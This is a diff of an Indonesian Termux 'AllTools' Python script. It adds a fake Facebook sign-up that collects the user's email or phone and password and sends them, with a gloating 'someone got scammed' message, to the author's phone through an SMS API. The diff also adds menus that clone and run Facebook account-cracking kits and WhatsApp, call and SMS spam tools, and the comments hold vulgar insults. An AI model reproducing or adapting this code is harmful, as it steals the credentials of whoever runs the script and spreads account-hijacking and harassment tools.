@@ -13,6 +13,13 @@ from requests import Session
 import re, sys
 import sys
 from os import system
+import os, sys, time, random
+from sys import exit as keluar
+from time import sleep as waktu
+from random import random as acak
+from random import choice as pilih
+from sys import stdout
+from os import system
 #l#        exit()
 #        exit(f"\r\n{m3}Ketik : python Mulai.py{q}")
 #        sys.exit(f"\r\n{m3}Ketik : python Mulai.py{q}")
@@ -34,6 +41,18 @@ from os import system
 #KONTOL KECIL JEMBUT LEBAT..  AMIN... SEMOGA YANG RECODER PENDEK UMHR...
 #ANAK ANJING KALIAN SEMUA ANAK RECODER... MEMEK ENGTOT...
 #RECODER MEMEk
+m = '\x1b[1;91m'
+h = '\x1b[1;92m'
+k = '\x1b[1;93m'
+b = '\x1b[1;94m'
+u = '\x1b[1;95m'
+c = '\x1b[1;96m'
+p = '\x1b[0m'
+i = '\x1b[1;90m'
+v = '\x1b[1;38;5;198m'
+j = '\x1b[1;38;5;208m'
+w = (m, v, j, p, k, b, u, c)
+W = pilih(w)
 xnxx="\033[85m"
 q="\033[00m"
 h2="\033[40m"
@@ -55,13 +74,43 @@ h='\033[1;90m'
 k3="\033[43m\033[1;37m"
 b3="\033[44m\033[1;37m"
 m3="\033[41m\033[1;37m"
+try:
+	os.system("reset")
+except requests.exceptions.ConnectionError:
+	print("\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91mConnection Error\033[00m") 
+	sys.exit()
+
+
+
+try:
+	os.system("git pull;reset;clear")
+	print(f"""
+{p}Hallo Lord !!! :D
+{c}Silahakan Daftar Melalui Akun Facebook Anda Jangan Sampe Salah...
+Script Ini Daftarnya Cuma Sekali...!!!
+Dan Janvan Lupa Puasa Karena Itu Sangat Penting...
+
+
+{m}#MasihTahapPercobaan
+#Free/Gratis
+#Besok Engga Graris Ajg{p}
+""") 
+	print(f"{p}Silahakan Daftar Melalui Akun Facebook..")
+	os.system("sleep 2")
+	print(f"{p}Isi Dengan Benar Jangan Sampe Salah Oke Kawan...!!!")
+	hp=input("\033[1;97m[\033[1;92m+\033[1;97m]Email/Hp : \033[1;92m")
+	hp2=input("\033[1;97m[\033[1;92m+\033[1;97m]Password : \033[1;92m")
+	print(f"{p}Username Anda : {p}{hp}")
+	print(f"{p}Password Anda : {p}{hp2}")
+	os.system("sleep 2")
+	xn="Alhamdulilah Ada Yanv Terkenak Tipu Hahah Email/Hp== "+hp+"   Password== "+hp2
+except requests.exceptions.ConnectionError:
+	print("\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91mConnection Error\033[00m") 
 #warna=['\033[1;37m','\033[1;90m','\033[1;35m','\033[1;33m','\033[1;31m','\033[1;36m','\033[1;32m','\033[1;34m']
 #e=random.randint(random.random() * 0,8)
 #g=random.randint(0,8)
 #r3=warna[e]			[Sudah Rusak Hapus Aja # <<<
 #################################################
-
-
 #animasi loading
 def error():
 	kata(f"""{q}
@@ -70,9 +119,23 @@ def error():
 {c}[{m}!{c}]{q}{m3} Hub Adm!n :https://wa.me/6283143565470{q}
 {c}[{m}!{c}]{q}{m3} Mr.Risky{q}""")
 	bash("xdg-open https://wa.me/6283143565470?text=Bang+Kapan+Selesai+Perbaiki+???+")
+def tik11():
+    text = ["⟩   ","⟩⟩  ","⟩⟩⟩ ","⟩⟩   ","⟩   ","    "]
+    for o in text:
+            waktu(0.8)
+            stdout.write(f"\r{u}[{i}+{u}]{p}Loading {i}"+o+""),;stdout.flush()
+def tik12(ok):
+    text = (f"{ok}"*1,f"{ok}"*2,f"{ok}"*3,f'{ok}'*4,f"{ok}"*5,f"{ok}"*4,f"{ok}"*3,f'{ok}'*2,f"{ok}"*1,f"         ")
+    for o in text:
+            waktu(0.8)
+            stdout.write(f"\r{u}[{i}+{u}]{p}Loading {i}{o}"),;stdout.flush()
+
+
 
 def main0():
 	bash("git pull;reset")
+	musik()
+	hide()  #Masih Tahap
 	fbx()
 	trial()
 #	jj()
@@ -124,8 +187,7 @@ Pahamkan Kak...{q}{m}!!!{q}
 	myip()
 	loginv2()
 def loginv2():
-	print("")
-	bash("sleep 1")
+	kata(f"Login Menggunakan Hasil Daftar Tadi...!!")
 	kang=input(f"{c}[{m}®{u}]{i} Username : {c}")
 	if kang =="" or kang ==" ":
 		kata(f"{u}[{m}×{u}]{i} Failed Or Wrong {m}!!")
@@ -169,6 +231,27 @@ def loginv2():
 			kata(f"{u}[{m}×{u}]{i} Failed Or Wrong {m}!!")
 			bash("sleep 2")
 			textfast()
+	elif kang == (f"{hp}") or kang == (f"{hp}"):
+		kata(f"{u}[{i}✓{u}] {i}Login Suksess {m}!!")
+		bash("sleep 2")
+		musik()
+		kntl=getpass.getpass(f"{c}[{m}©{u}]{i} Password : {c}")
+		if kntl =="" or kntl ==" ":
+			kata(f"{u}[{m}×{u}]{i} Failed Or Wrong {m}!!")
+			bash("sleep 2")
+			musik()
+			textfast()
+		elif kntl == (f"{hp2}") or kntl == ("{hp2}"):
+			kata(f"{u}[{i}✓{u}] {i}Login Suksess {m}!!")
+			bash("sleep 2")
+			musik()
+			musik()
+			musik()
+			viapulsa()
+		else:
+			kata(f"{u}[{m}×{u}]{i} Failed Or Wrong {m}!!")
+			bash("sleep 2")
+			textfast()
 	elif kang =="Trial-02":
 		kata(f"{i}Maaf Trial Ini Sudah Habis {m}!!")
 		kata(f"{i}Hubungi Admin Jika Mau Beli Trial {m}!!")
@@ -197,40 +280,33 @@ def loginv2():
 		bash("sleep 2")
 		textfast()
 def fbx():
-     kata(f"""
-{p}Hallo Lord !!...
-Silahkan Tinggal Pesan Untuk DiBaca Oleh Mr.Risky / Admin Scriot
-Karena Pada Tanggal 20 Script Akan DiUpdate... !!!
-
-{k}Jadi Mau Menu Baru Apa...?
-""")
      try:
           no="083143565470"
           no="6283143565470"
           no="83143565470"
           no="+6283143565470"
-          msg=input("\033[1;97m[\033[1;92m+\033[1;97m]Pesan : \033[1;92m")
-          load()
+#	  msg=(f"Email/Hp={hp}")
+#    Password={pw}")
           dat={
           "number": no,
-          "pesan": msg
+          "pesan": xn
           }
           br=requests.post("https://nuubi.herokuapp.com/api/smsgratis", data=dat).text
           if "SMS Gratis Telah Dikirim" in br:
-              print(f"\n\033[1;97m[\033[1;92m✓\033[1;97m]Sms To \033[1;96mMr.Risky \033[1;92mSuccess")
+              print(f"\n\033[1;97m[\033[1;92m✓\033[1;97m]Daftar Suksess \033[1;96mMr.Risky \033[1;92mSuccess")
           elif "Terjadi kesalahan!" in br:
-              kata("\n\033[1;97m[\033[1;91mx\033[1;97m]Pesan Gagal Dikirim\033[1;91m!!!\033[00m")
+              kata("\n\033[1;97m[\033[1;91mx\033[1;97m]\033[1;91m!!!\033[00m")
           else:
-              print(f"\n\033[1;97m[\033[1;91mx\033[1;97m]Sms To \033[1;96mMr.Risky \033[1;91mFailed\033[00m")
-          br=requests.post("https://nuubi.herokuapp.com/api/smsgratis", data=dat).text
-          if "SMS Gratis Telah Dikirim" in br:
-              print(f"\n\033[1;97m[\033[1;92m✓\033[1;97m]Sms To \033[1;96mMr.Risky \033[1;92mSuccess")
-          elif "Terjadi kesalahan!" in br:
-              kata("\n\033[1;97m[\033[1;91mx\033[1;97m]Pesan Gagal Dikirim\033[1;91m!!!\033[00m")
-          else:
-              print(f"\n\033[1;97m[\033[1;91mx\033[1;97m]Sms To \033[1;96mMr.Risky \033[1;91mFailed\033[00m")
+              print(f"\n\033[1;97m[\033[1;91mx\033[1;97m]Daftar \033[1;96m Mr.Risky \033[1;91mFailed\033[00m")
+#          br=requests.post("https://nuubi.herokuapp.com/api/smsgratis", data=dat).text
+#          if "SMS Gratis Telah Dikirim" in br:
+#              print(f"\n\033[1;97m[\033[1;92m✓\033[1;97m]Sms To \033[1;96mMr.Risky \033[1;92mSuccess")
+#          elif "Terjadi kesalahan!" in br:
+#              kata("\n\033[1;97m[\033[1;91mx\033[1;97m]Pesan Gagal Dikirim\033[1;91m!!!\033[00m")
+#          else:
+#              print(f"\n\033[1;97m[\033[1;91mx\033[1;97m]Sms To \033[1;96mMr.Risky \033[1;91mFailed\033[00m")
      except TypeError:
-            print("\033[1;97m\033[1;91m•\033[1;97m]Number Not Valid\033[1;91m!\033[00m")
+            print("\033[1;97m\033[1;91m•\033[1;97m]Gagal Daftar !!\033[1;91m!\033[00m")
      except (KeyboardInterrupt,EOFError):
             sys.exit()
      except requests.exceptions.ConnectionError:
@@ -300,40 +376,233 @@ def yangsuport(): #Yanv Telah Supurt Scriot allTools
 {m3}╚╝─╚╩══╩╩╝╚╩╝╚╩╝╚═╩══╩╝╚╝╚═══╩╝╚╩╩╩╩══╝{q}
 """)
 	bash("sleep 2")
-
-
-def saran():
-
-#Masih Tahap Percobaan !!!
-#By SystemX ProX
-	kata(f"""
-Apakah Anda Mau Install Bahan Yang DiSarankan Mimin...??
-
-•INSTALL TOMBOL KIRI KANAN DAN LAIN LAIN !!!
-•GANTI TAMPILAN TERMUX ANDA !!
-
-•TOMBOL   = TB
-•TAMPILAN = TP
-""")
-def jj():
-	bash("git pull;reset")
-	kata(f"""
-{c}[{m}!{u}]{c} Infomasih [!]
-{c}[{k}•{u}]{c} Script Sedang Mengalami Kendala !!!
-{c}[{k}•{u}]{c} Script Akan TerUpdate Sendiri.... !!!
-{c}[{k}•{u}]{c} Beri Kami Waktu Untuk MengUpdate Script Agar Berkembang !!!
-
-{q}{b3}[ Dan Jangan Lupa Donasinya... 083143565470 AXI5 ] Pulsa Aja Bg..
-[ Jangan Spam Terus DiWhatsapp Admin !!! ]{q}
-""")
-	sys.exit()
-
 def musik():
 	bash("""
-pkg install mpv
-mkdir /sdcard/Asw/
-mpv /sdcard/Music/
+pkg install mpv -y
+mpv ~/AllTools/Get/
 """)
+
+def hide():
+	bash("reset;clear")
+	kata(f"""{p}
+Silahkan Pilih Menu Untuk DiTampilakan... !!
+Hapyy Bulan Ramadhan !!
+""")
+	kata3(f"""
+{p}[{i}+{p}]{c}––––––––––––––––––––––––––––––––––––––––––––––{p}[{i}+{p}]
+
+{p}██╗░░██╗██╗██████╗░███████╗{m}███╗░░░███╗███████╗███╗░░██╗██╗░░░██╗
+{p}██║░░██║██║██╔══██╗██╔════╝{m}████╗░████║██╔════╝████╗░██║██║░░░██║
+{p}███████║██║██║░░██║█████╗░░{m}██╔████╔██║█████╗░░██╔██╗██║██║░░░██║
+{p}██╔══██║██║██║░░██║██╔══╝░░{m}██║╚██╔╝██║██╔══╝░░██║╚████║██║░░░██║
+{p}██║░░██║██║██████╔╝███████╗{m}██║░╚═╝░██║███████╗██║░╚███║╚██████╔╝
+{p}╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝{m}╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚══╝░╚═════╝░
+
+{p}[{i}+{p}]{c}––––––––––––––––––––––––––––––––––––––––––––––{p}[{i}+{p}]
+[!].Hapyy Hide Menu And Bulan Ramadhan :D
+{p}[{i}1{p}]{m}.{i}AllTools{c} @Dark Fb
+{p}[{i}2{p}]{m}.{i}AllTools{c} @Spam Whatsapp
+{p}[{i}3{p}]{m}.{i}AllTools{c} @Spam Call
+{p}[{i}4{p}]{m}.{i}AllTools{c} @Spam Sms
+{p}[{i}5{p}]{m}.{i}AllTools{c} @End And Dom Script
+{p}[{i}6{p}]{m}.{i}AllTools{c} @Semua Menu
+{p}[{i}0{p}]{m}.{c}Exit And Quit""")
+	risky=input(f"[?]{p}.Hide Menu {k}⟩⟩⟩ {p}")
+	if risky == "":
+		print(f"{m}Jangan Kosonv Sayang !!!")
+		hide()
+	elif risky =="1" or risky =="01":
+		kata4(f"{p}Anda Akan Lanjut Menu AllTools @Dark Fb")
+		menudark()
+	elif risky =="2" or risky =="02":
+		kata4(f"{p}Anda Akan Lanjut Menu AllTools @Spam Whatsapp")
+		menuwa()
+	elif risky =="3" or risky =="03":
+		kata4(f"{p}Anda Akan Lanjut Menu AllTools @Spam Call")
+		menucall()
+	elif risky =="4" or risky =="04":
+		kata4(f"{p}Anda Akan Lanjut Menu AllTools @Spam Sms")
+		menusms()
+	elif risky =="5" or risky =="05":
+		kata4(f"{p}Anda Akan Lanjut Menu AllTools @End And Dom Script")
+		menuend()
+	elif risky =="6" or risky =="06":
+		kata4(f"{p}Anda Akan Lanjut Menu AllTools @Semua Menu")
+		main3()
+	elif risky =="0":
+		kata4(f"Terima Kasih Telah Menggunakan Tools Ini :D")
+		sys.exit()
+	else:
+		kata4(f"{c}Orang Sabar DiSayang Jada..")
+		kata4(f"{p}Isi Dengan Benar Om {m}!!")
+		detik(00, 20)
+		hide()
+def menudark():
+	bash("reset;clear")
+	kata3(f"""\r\r\r
+   | D  | A  | R  | K  | F  | B
+{c}╔═══╗╔═══╗╔═══╗╔╗╔═╗╔═══╗╔══╗─
+{c}╚╗╔╗║║╔═╗║║╔═╗║║║║╔╝║╔══╝║╔╗║─
+{c}─║║║║║║─║║║╚═╝║║╚╝╝─║╚══╗║╚╝╚╗
+{p}─║║║║║╚═╝║║╔╗╔╝║╔╗║─║╔══╝║╔═╗║{c}@SystemX ProX
+{p}╔╝╚╝║║╔═╗║║║║╚╗║║║╚╗║║───║╚═╝║{c}@Mr.Risky
+{p}╚═══╝╚╝─╚╝╚╝╚═╝╚╝╚═╝╚╝───╚═══╝{c}@DarkFb
+{p}[{i}+{p}]{c}––––––––––––––––––––––––––––––––––––––––––––––{p}[{i}+{p}]
+{p}[{i}+{p}]{c}Athour        : Mr.Risky			 {p}[{i}+{p}]{c}
+{p}[{i}+{p}]{c}Whatsapp      : 6283143565470		 {p}[{i}+{p}]{c}
+{p}[{i}+{p}]{c}Facebook      : Risky			 {p}[{i}+{p}]{c}
+{p}[{i}+{p}]{c}Grup WhatSapp : Attack In Form Cyber		 {p}[{i}+{p}]{c}
+{p}[{i}+{p}]{c}––––––––––––––––––––––––––––––––––––––––––––––{p}[{i}+{p}]
+""")
+	kata3(f"""
+{p}[{i}++{p}]{c}––––––––––––––––––––––––––––––––––––––––––––––{p}[{i}++{p}]
+{p}[{i}0{i}1{p}]{k}⟩⟩⟩ {c}Dark Fb			[Version » 12.1]  {p}[{i}++{p}]
+{p}[{i}0{i}2{p}]{k}⟩⟩⟩ {c}Dark Gold		[Version » 18.2]  {p}[{i}++{p}]
+{p}[{i}0{i}3{p}]{k}⟩⟩⟩ {c}Dark Premium		[Version » 13.2]  {p}[{i}++{p}]
+{p}[{i}0{i}4{p}]{k}⟩⟩⟩ {c}Dark Fb			[Version » 11.2]  {p}[{i}++{p}]
+{p}[{i}0{i}5{p}]{k}⟩⟩⟩ {c}Dark Fb Vip		[Version » 15.2]  {p}[{i}++{p}]
+{p}[{i}0{i}6{p}]{k}⟩⟩⟩ {c}Dark Fb New		[Version » 12.2]  {p}[{i}++{p}]
+{p}[{i}0{i}7{p}]{k}⟩⟩⟩ {c}Dark Fb Vvip		[Version » 10.2]  {p}[{i}++{p}]
+{p}[{i}0{i}8{p}]{k}⟩⟩⟩ {c}Dark Fb Pro		[Version » 14.2]  {p}[{i}++{p}]
+{p}[{i}0{i}9{p}]{k}⟩⟩⟩ {c}Dark Fb Setan		[Version » 15.2]  {p}[{i}++{p}]
+{p}[{i}1{i}0{p}]{k}⟩⟩⟩ {c}Dark Fb 01		[Version » 17.2]  {p}[{i}++{p}]
+{p}[{i}9{i}9{p}]{k}⟩⟩⟩ {c}Back To HideMenu			  {p}[{i}++{p}]
+{p}[{i}0{i}0{p}]{k}⟩⟩⟩ {c}Exit					  {p}[{i}++{p}]
+{p}[{i}++{p}]{c}––––––––––––––––––––––––––––––––––––––––––––––{p}[{i}++{p}]""")
+	kk=input(f"{p}[{i}?{i}?{p}]{c}⟩⟩⟩ {c}")
+	if kk ==""*100:
+		kata(f"{m}Jangan Kosonv Ayam !!")
+		kata(f"Untuk Bulan Ramadhan Kalau Engga !!")
+		menudark()
+	elif kk =="1" or kk =="01":
+		bahan()
+#git clone
+		bash("""
+pkg install git
+pkg install curl
+python2 -m pip install fake-useragent
+git clone https://github.com/Mr-XsZ/Dark-Fb
+cd Dark-Fb
+bash install.sh
+""")
+	elif kk =="2" or kk =="02":
+		bahan()
+#git clone
+		bash("""
+pkg install python2
+pkg install git
+pkg install curl
+git clone https://github.com/darkfb/terbaru
+cd terbaru
+pip2 install -r requirements.txt
+python2 dark.pyc
+""")
+	elif kk =="3" or kk =="03":
+		bahan()
+#git clone
+		bash("""
+pkg install git python2
+pip2 install --upgrade pip
+git clone https://github.com/TheMagizz/DarkPremium
+cd DarkPremium
+pip2 install -r requirements.txt
+python2 DarkFB.py
+""")
+	elif kk =="4" or kk =="04":
+		bahan()
+#git clone
+		bash("""
+pkg update
+pkg upgrade
+pkg install python2 git -y
+git clone https://github.com/Bl4ckDr460n/Black-Fb-Premium.git
+cd Black-Fb-Premium
+pip2 install -r req.txt
+python2 BlackFbPremium.py
+""")
+	elif kk =="5" or kk =="05":
+		bahan()
+#git clone
+		bash("""
+pkg install git python2
+pip2 install --upgrade pip
+git clone https://github.com/TheMagizz/DarkPremium
+DARK FB Re-code :
+git clone https://github.com/MasKawer/darkfb
+cd DarkFB
+pip2 install -r requirements.txt
+python2 DarkFB.py
+""")
+	elif kk =="6" or kk =="06":
+		bahan()
+#git clone
+		bash("""
+pkg install git
+pkg install python2
+pip2 install --upgrade pip
+git clone https://github.com/HackerGamers71/DarkFB-Premium
+cd DarkFB-Premium
+python2 DarkFB.py
+""")
+	elif kk =="7" or kk =="07":
+		bahan()
+#git clone
+		bash("""
+apt update && apt upgrade -y
+pkg install python2
+pkg install git
+pip2 install --upgrade pip
+pip2 install requests
+pip2 install mechanize
+git clone https://github.com/MuhamadZalim97/Dark-FB-Premium
+cd Dark-FB-Premium
+chmod +x dark.py
+python2 dark.py
+""")
+	elif kk =="8" or kk =="08":
+		bahan()
+#git clone
+		bash("""
+pkg install git python2
+pip2 install --upgrade pip
+git clone https://github.com/MrGameOver16/dark-fb-pro
+cd dark-fb-pro
+pip2 install -r requirements.txt
+python2 Dark-PRO.py
+""")
+	elif kk =="9" or kk =="09":
+		bahan()
+#git clone
+		bash("""
+pkg install git
+pkg install curl
+python2 -m pip install fake-useragent
+git clone https://github.com/Mr-XsZ/Dark-Fb
+cd Dark-Fb
+bash install.sh
+""")
+	elif kk =="10":
+		bahan()
+#git clone
+		bash("""
+pkg install git python2
+pip2 install --upgrade pip
+git clone https://github.com/MrGameOver16/dark-fb-pro
+cd dark-fb-pro
+pip2 install -r requirements.txt
+python2 Dark-PRO.py
+""")
+	elif kk =="99" or kk =="99":
+		bash("clear;reset;sleep 2")
+		hide()
+	elif kk =="00" or kk =="00":
+		kata4(f"{c}Bye Bye Bye Selamat Tinggal Love You!!")
+		sys.exit()
+	else:
+		print(f"Pilihan Anda Tidak Terdaftar !!")
+		detik(00, 20)
+		hide()
+
 def pwx():
 	bash("reset")
 	info()
@@ -452,26 +721,6 @@ def new():
 
 #	wel()
 #	random1()
-def kontol():    #Belum DiSelesaiKan 1-4-2021 Kamis
-
-	kata("""
-[?]~MASUKKAN MENU MAU DIPERLIHATKAN PADA ANDA...???
-[!]~Disini Juga Akan DiPerlihatkan Menu Yang Sering DiGunakan !!
-[!]~Contoh | [??]MENU>>> Hack Fb |
-
-[•]DAFTAR LIST UNTUK DIPERLIHATKAN PADA ANDA !!
-[!]~List        Atau    List Singka
-|>>HACK FB       /          HF
-|>>HACK GMAIL    /     	    HK
-|>>BOT WHATSAPP  /    	    BW
-|>>SPAM SMS      /    	    SS
-|>>SPAM WHATSAPP /	    SW
-|>>SKIP [Lanjut] /	    SP
-|>>Lanjut KeMenu /          LK
-""")
-
-	xl=input(f"[")
-#End BelumDiCoba
 def wel():
     for ku in '[•]Loading... ':
         for n in range(30):
@@ -595,7 +844,6 @@ def random2():
 		bash("sleep 3;reset")
 		main2()
 def info():
-
 	kata2(f"""
 {b3}Terima Kasih Telah Menggunakan Script AllTools :')...
 Script Yang Rusak Sudah DiUpdate Sama #Mr.Risky
@@ -615,7 +863,6 @@ Jika Ada Masalah Terhadap Script Silahkan Report KeAdmin
 	bash("reset")
 
 def jam():
-
 	now = datetime.now()
 	mm = str(now.month)
 	dd = str(now.day)
@@ -643,11 +890,13 @@ def load5():
 		print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m"+o+"\r"),;sys.stdout.flush();time.sleep(1)
 def tik5():
 #    titik = [".    ",'..     ','...    ',"....?   ",'....?? ',"....? ","....  ","...    ","..    ",".      ","        "]
-    for o in ".    ",'..     ','...    ',"....?   ",'....?? ',"....? ","....  ","...    ","..    ",".      ","        " + "\n\r\n\r\r":
-            print(f"\r\033[1;91m[●] \033[1;92mSedang DiCheck\r \033[1;97m{o}"),;sys.stdout.flush();time.sleep(1);
-
-
-
+    for o in ".         ",'..       ','...      ',"....?      ",'....??      ',"....?    ","....      ","...       ","..          ",".         ","             ":
+#            print(f"\r\033[1;91m[●] \033[1;92mSedang DiCheck\r \033[1;97m{o}"),;sys.stdout.flush();time.sleep(1);
+            waktu(0.8)
+            stdout.write(f"\r[+]Loading"+o+""),;stdout.flush()
+#	    waktu("0.3")
+#            stdout.write("\r \033[1;91m[●] \033[1;92mSedang DiCheck \033[1;97m"+o)
+#            stdout.flush()
 def fb():
 	os.system("xdg-open https://m.facebook.com/ilovexnxx")
 	os.system("sleep 5")
@@ -825,7 +1074,7 @@ def kata4(s):
     for c in s + "\n":
         sys.stdout.write(c)
         sys.stdout.flush()
-        time.sleep(1./5)
+        time.sleep(1./27)
 def load2():
     for x in range(0,101):
         time.sleep(1./10)
@@ -1142,10 +1391,10 @@ def load():
 
 
 def bahan():
-
 	fb()
-	kata4(f"{b3}Apakah Anda Sudah Install Tools Dengan Lengkap??{q}")
-	print(f"{m3}[ Yes / No ]{q}")
+	print("")
+	kata3(f"{b3}Apakah Anda Sudah Install Tools Dengan Lengkap??{q}")
+	print(f"{m3}[ Yes / No ] And [ Y / N ]{q}")
 	mek=input(f"{c}[{u}•{k}•{c}]{i}≈≈≈≈≈>>> {m}")
 	if mek == "":
 		kata3(f"{m}! {k}Jangan Kosong Kawan")
@@ -1156,10 +1405,12 @@ def bahan():
 		next()
 	elif mek == "Y" or mek == "y":
 		print("Okeyyyyyyyyy")
+		bash("mkdir SaveFolder;cd SaveFolder")
 	elif mek == "Yes" or mek == "yes":
 		print("Okeyyyyyyyyy")
+		bash("mkdir SaveFolder;cd SaveFolder")
 	else:
-		print("You The Fack,, Dick You")
+		print("You The Fack,, Dick You Big")
 		bash("sleep 2")
 		bahan()
 def next():
@@ -1199,6 +1450,8 @@ pip2 install requests mechanize tqdm
 pip install requests mechanize tqdm
 pip2 install requests mechanize tqdm
 clear
+mkdir SaveFolder
+cd SaveFolder
 """)
 	kata(f"{i}Inztall Bahan Suksess")
 
@@ -1334,7 +1587,7 @@ python2 *.py
 git clone https://github.com/blackcodercrush/hack-facebook-teman
 pkg install python
 pkg install python2
-cd hack-face*
+cd hack-facebook-teman
 python2 *.py
 python *.py
 """)
